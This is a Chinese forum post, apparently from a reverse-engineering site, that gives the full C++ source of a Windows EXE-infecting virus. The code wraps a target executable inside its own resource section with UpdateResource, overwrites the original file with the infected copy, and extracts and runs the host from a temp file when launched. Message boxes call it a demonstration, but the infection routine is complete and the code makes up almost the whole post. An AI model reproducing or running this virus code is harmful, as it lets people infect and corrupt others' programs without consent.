

# 很土的感染 EXE 文件的方法。

> 原文：[`www.pediy.com/kssd/pediy12/140272.html`](https://www.pediy.com/kssd/pediy12/140272.html)

发表一个感染 EXE 病毒 code：  
  
  

代码:

```
#include "stdafx.h"

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
   // TODO: Place code here.
char syspath\[256\];
TCHAR src\[MAX\_PATH\]="xx.exe";
TCHAR szMyName\[MAX\_PATH\];
TCHAR szTempFileA\[MAX\_PATH\];
TCHAR szTempFileB\[MAX\_PATH\];
GetSystemDirectory(syspath,256);
GetModuleFileName(NULL,szMyName,MAX\_PATH);
HANDLE hFile;
DWORD dwFileSize, 
dwBytesRead;
STARTUPINFO si;
PROCESS\_INFORMATION pi;
MessageBox(NULL,"这是一个病毒，你可以选择感染的文件，也可不选~","演示病毒 UpadatResource 1.0",0x1000);
GetTempFileName(syspath,"vic",0,szTempFileA);
GetTempFileName(syspath,"host",0,szTempFileB);
CopyFile(szMyName,szTempFileA,0);//病毒体 copy 到 szTempFileA 里
HMODULE hLibrary;
HRSRC hResource;
HGLOBAL hResourceLoaded;
LPBYTE lpBuffer;
hLibrary = LoadLibrary(szTempFileA);
if (NULL != hLibrary)
{

    
  hResource = FindResource(hLibrary, MAKEINTRESOURCE(104), RT\_RCDATA);  //打开指定的节。如果打开成功则写入临时文件执行。
        if (NULL != hResource)

    {
           
      hResourceLoaded = LoadResource(hLibrary, hResource);
              
      if (NULL != hResourceLoaded) 
      
      {

        lpBuffer = (LPBYTE) LockResource(hResourceLoaded); 

        if (NULL != lpBuffer) 

        { 

          DWORD dwBytesWritten;

          dwFileSize = SizeofResource(hLibrary, hResource);

          hFile = CreateFile(szTempFileB,

            GENERIC\_WRITE,

            0,

            NULL,

            CREATE\_ALWAYS,

            FILE\_ATTRIBUTE\_NORMAL,

            NULL);


          if (INVALID\_HANDLE\_VALUE != hFile)

          {


              MessageBox(NULL,szTempFileB,GetCommandLine(),0x1000);
  
            WriteFile(hFile, lpBuffer, dwFileSize, &dwBytesWritten, NULL);


            CloseHandle(hFile);

          }

          GetStartupInfo(&si);

          CreateProcess(szTempFileB,GetCommandLine(),NULL,NULL,NULL,NULL,NULL,NULL,&si,&pi);
  
          MessageBox(NULL,szTempFileB,GetCommandLine(),0x1000);

        }

      } 

    }

FreeLibrary(hLibrary);
}

char Filename\[256\] = "c:\\\\ssss.exe"; //被感染的文件路径。。
hFile = CreateFile(Filename, GENERIC\_READ,
0,
NULL,
OPEN\_EXISTING,
FILE\_ATTRIBUTE\_NORMAL,
NULL);

if(INVALID\_HANDLE\_VALUE == hFile)
{
  MessageBox(NULL,"HOST 文件打开失败","。",0x1000);
}
if (INVALID\_HANDLE\_VALUE != hFile)
{
    

dwFileSize = GetFileSize(hFile, NULL);

lpBuffer = new BYTE\[dwFileSize\];

if (ReadFile(hFile, lpBuffer, dwFileSize, &dwBytesRead, NULL) != FALSE)
{
  

hResource = (HRSRC)BeginUpdateResource(szTempFileA, FALSE);
if (NULL != hResource)
{

  
if (UpdateResource(hResource,
RT\_RCDATA,
MAKEINTRESOURCE(104),
MAKELANGID(LANG\_NEUTRAL, SUBLANG\_DEFAULT),
(LPVOID) lpBuffer,
dwFileSize) != FALSE)
{

EndUpdateResource(hResource, FALSE);
}

}

delete \[\] lpBuffer; 
CloseHandle(hFile);


if(CopyFile(szTempFileA,Filename,0))
{
    //  MessageBox(NULL,Filename,szTempFileA,0x1000);
}//Any Thing is every thing~
Sleep(1000);


DeleteFile(szTempFileA);
while(!DeleteFile(szTempFileB)) ;
}
}

  return 0;
}

```